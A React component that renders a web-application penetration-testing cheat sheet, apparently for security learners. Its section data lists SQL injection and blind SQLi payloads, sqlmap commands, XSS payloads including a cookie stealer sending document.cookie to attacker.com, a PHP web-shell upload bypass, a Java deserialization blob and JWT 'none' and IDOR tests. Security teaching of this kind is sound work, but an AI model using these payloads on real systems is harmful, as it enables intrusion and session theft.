import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaGlobe, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const WebAppTesting = () => {
  const [expandedSection, setExpandedSection] = useState('basics');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'walkthrough',
      title: 'Guided Web App Attack Chain Walkthrough',
      content: [
        {
          type: 'markdown',
          value: 'Follow this step-by-step chain for a typical web application penetration test. Expand each step for details and commands.'
        },
        {
          type: 'step',
          title: '1. Recon & Enumeration',
          description: 'Identify endpoints, directories, and subdomains.',
          commands: [
            { value: 'ffuf -u http://example.com/FUZZ -w wordlist.txt', description: 'Directory brute-forcing' },
            { value: 'subfinder -d example.com', description: 'Subdomain enumeration' },
            { value: 'curl -I http://example.com', description: 'Check HTTP headers' }
          ]
        },
        {
          type: 'step',
          title: '2. SQL Injection Testing',
          description: 'Test for SQL injection vulnerabilities manually and with automation.',
          commands: [
            { value: "' OR 1=1 --", description: 'Manual SQLi payload' },
            { value: 'sqlmap -u "http://example.com?id=1" --risk=3 --level=5 --batch', description: 'Automated SQLi with sqlmap' }
          ]
        },
        {
          type: 'step',
          title: '3. XSS Testing',
          description: 'Test for reflected and stored XSS.',
          commands: [
            { value: '<script>alert(1)</script>', description: 'Basic XSS payload' },
            { value: '<svg/onload=alert(1)>', description: 'SVG XSS payload' }
          ]
        },
        {
          type: 'step',
          title: '4. File Upload & RCE',
          description: 'Test for file upload bypasses and remote code execution.',
          commands: [
            { value: 'GIF89a; <?php system($_GET[\'cmd\']); ?>', description: 'PHP file upload bypass (magic bytes)' },
            { value: 'shell.php.jpg', description: 'Double extension upload' }
          ]
        },
        {
          type: 'step',
          title: '5. API & Logic Attacks',
          description: 'Test for IDOR, mass assignment, and JWT attacks.',
          commands: [
            { value: 'GET /api/user/123 HTTP/1.1', description: 'IDOR test' },
            { value: 'POST /api/users HTTP/1.1\n{"username":"test","is_admin":true}', description: 'Mass assignment test' },
            { value: 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', description: 'JWT none attack' }
          ]
        },
        {
          type: 'markdown',
          value: '**Tip:** After each step, check for new vulnerabilities and document your findings!'
        }
      ]
    },
    {
      id: 'basics',
      title: 'Basic Testing',
      content: [
        {
          type: 'markdown',
          value: `### Manual Testing
- **Endpoints**: Check \`/admin\`, \`/api\`, \`/backup\`, \`/.git\`
- **Headers**: \`curl -I http://example.com\`
- **Directory Brute-forcing**: \`ffuf -u http://example.com/FUZZ -w wordlist.txt\`
- **Subdomain Enumeration**: \`subfinder -d example.com\``
        }
      ]
    },
    {
      id: 'sqli',
      title: 'SQL Injection',
      content: [
        {
          type: 'markdown',
          value: `### Manual Testing
\`\`\`sql
' OR 1=1 --
" OR 1=1 --
' UNION SELECT 1,2,3,4,5--
' UNION SELECT null,table_name,null from information_schema.tables--
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Automated Testing
\`\`\`bash
sqlmap -u "http://example.com?id=1" --risk=3 --level=5 --batch
sqlmap -u "http://example.com" --data="user=admin&pass=123" --dbs
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Blind SQLi
\`\`\`sql
admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
\`\`\``
        }
      ]
    },
    {
      id: 'xss',
      title: 'Cross-Site Scripting',
      content: [
        {
          type: 'markdown',
          value: `### Payloads
\`\`\`html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
javascript:alert(document.domain)
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Advanced XSS
\`\`\`javascript
// DOM XSS
eval(location.hash.slice(1))
// Cookie Stealer
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
\`\`\``
        }
      ]
    },
    {
      id: 'rce',
      title: 'Remote Code Execution',
      content: [
        {
          type: 'markdown',
          value: `### File Upload Bypasses
\`\`\`bash
# Magic bytes for GIF
GIF89a; <?php system($_GET['cmd']); ?>
# Double extensions
shell.php.jpg
# Null byte injection
shell.php%00.jpg
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Deserialization
\`\`\`java
// Java deserialization
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAABh3CAAAABAAAAABc3IADGphdmEubmV0LlVSTLZJzxhMpBi4AgABTAAIZmlsZVBhdGh0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQACy9ldGMvcGFzc3dk
\`\`\``
        }
      ]
    },
    {
      id: 'api',
      title: 'API Security',
      content: [
        {
          type: 'markdown',
          value: `### Testing Methods
\`\`\`http
# IDOR
GET /api/user/123 HTTP/1.1
# Mass Assignment
POST /api/users HTTP/1.1
{"username":"test","is_admin":true}
# JWT Attacks
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaGlobe /> Web Application Testing Cheat Sheet
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive web application security testing guide covering OWASP Top 10 
          vulnerabilities with modern exploitation techniques.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => {
                    if (item.type === 'command') {
                      return (
                        <div key={index} className="content-item">
                          <div className="command-item">
                            <div className="command-header">
                              <code>{item.value}</code>
                              <button
                                onClick={() => handleCopy(item.value)}
                                className="copy-button small"
                              >
                                Copy
                              </button>
                            </div>
                            <p className="command-description">{item.description}</p>
                          </div>
                        </div>
                      );
                    } else if (item.type === 'markdown') {
                      return (
                        <div key={index} className="content-item">
                          <div className="markdown-content">
                            <ReactMarkdown>
                              {item.value}
                            </ReactMarkdown>
                          </div>
                        </div>
                      );
                    } else if (item.type === 'step') {
                      return (
                        <div key={index} className="content-item walkthrough-step">
                          <div className="step-header">
                            <strong>{item.title}</strong>
                          </div>
                          <div className="step-description">{item.description}</div>
                          <div className="step-commands">
                            {item.commands.map((cmd, i) => (
                              <div key={i} className="command-item">
                                <div className="command-header">
                                  <code>{cmd.value}</code>
                                  <button
                                    onClick={() => handleCopy(cmd.value)}
                                    className="copy-button small"
                                  >
                                    Copy
                                  </button>
                                </div>
                                <p className="command-description">{cmd.description}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    } else {
                      return null;
                    }
                  })}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default WebAppTesting;